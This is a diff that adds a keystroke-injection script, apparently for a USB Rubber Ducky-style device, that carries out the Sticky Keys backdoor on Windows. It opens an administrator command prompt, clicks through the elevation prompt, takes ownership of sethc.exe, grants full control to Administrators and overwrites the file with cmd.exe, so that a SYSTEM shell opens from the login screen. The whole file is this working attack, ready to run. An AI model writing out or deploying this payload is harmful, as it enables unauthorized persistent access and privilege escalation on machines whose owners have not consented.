@@ -1,0 +1,36 @@
+REM Sticky Keys
+
+REM Open CMD like admin
+DELAY 1000
+GUI r
+DELAY 500
+ALTSTRING cmd
+CTRL-SHIFT ENTER
+DELAY 750
+TAB
+DELAY 750
+TAB
+DELAY 750
+ENTER
+DELAY 750
+
+REM Sticky keys attack
+
+REM Obtain Permissions
+ALTSTRING takeown /F "C:\Windows\System32\sethc.exe"
+ENTER
+DELAY 300
+ALTSTRING icacls "C:\Windows\System32\sethc.exe" /grant Administradores:F
+ENTER
+DELAY 300
+
+REM Change sethc.exe to cmd.exe
+ALTSTRING copy /y c:\windows\system32\sethc.exe c:\windows\system32\sethc2.exe
+ENTER
+DELAY 300
+ALTSTRING copy /y c:\windows\system32\cmd.exe c:\windows\system32\sethc.exe
+ENTER
+
+REM Close window
+ALT F4
+
